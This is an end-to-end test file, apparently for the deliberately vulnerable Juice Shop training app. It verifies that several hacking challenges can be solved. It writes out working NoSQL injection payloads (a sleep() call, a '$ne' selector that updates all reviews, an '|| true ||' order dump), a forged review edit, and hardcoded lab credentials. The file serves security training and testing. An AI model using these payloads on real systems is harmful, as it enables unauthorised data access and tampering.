const config = require('config')
const http = require('http')

const REST_URL = 'http://localhost:3000/rest'

describe('/rest/product/reviews', () => {
  beforeEach(() => {
    browser.get('/#/search')
  })

  describe('challenge "NoSql Command Injection"', () => {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

    it('should be possible to inject a command into the get route', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.get(\'/rest/product/sleep(1000)/reviews\');')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 1' })
  })

  describe('challenge "NoSql Reviews Injection"', () => {
    it('should be possible to inject a selector into the update route', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": { "$ne": -1 }, "message": "injected" });')
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 2' })
  })

  describe('challenge "NoSql Orders Injection"', () => {
    it('should be possible to inject and get all the orders', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.get(\'/rest/track-order/%27%20%7C%7C%20true%20%7C%7C%20%27\');')
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 3' })
  })

  describe('challenge "Forged Review"', () => {
    protractor.beforeEach.login({ email: 'mc.safesearch@' + config.get('application.domain'), password: 'Mr. N00dles' })

    let reviewId
    beforeEach((done) => {
      http.get(REST_URL + '/product/1/reviews', (res) => {
        let body = ''

        res.on('data', chunk => {
          body += chunk
        })

        res.on('end', () => {
          const response = JSON.parse(body)
          reviewId = response.data[0]._id
          done()
        })
      })
    })

    it('should be possible to edit any existing review', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": "' + reviewId + '", "message": "injected" });')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'Forged Review' })
  })

  describe('challenge "Multiple Likes"', () => {
    protractor.beforeEach.login({ email: 'mc.safesearch@' + config.get('application.domain'), password: 'Mr. N00dles' })

    let reviewId
    beforeEach((done) => {
      http.get(REST_URL + '/product/1/reviews', (res) => {
        let body = ''

        res.on('data', chunk => {
          body += chunk
        })

        res.on('end', () => {
          const response = JSON.parse(body)
          reviewId = response.data[0]._id
          done()
        })
      })
    })

    it('should be possible to like reviews multiple times', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.post(\'/rest/product/reviews\', { "id": "' + reviewId + '" }); $http.post(\'/rest/product/reviews\', { "id": "' + reviewId + '" });')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'Multiple Likes' })
  })
})
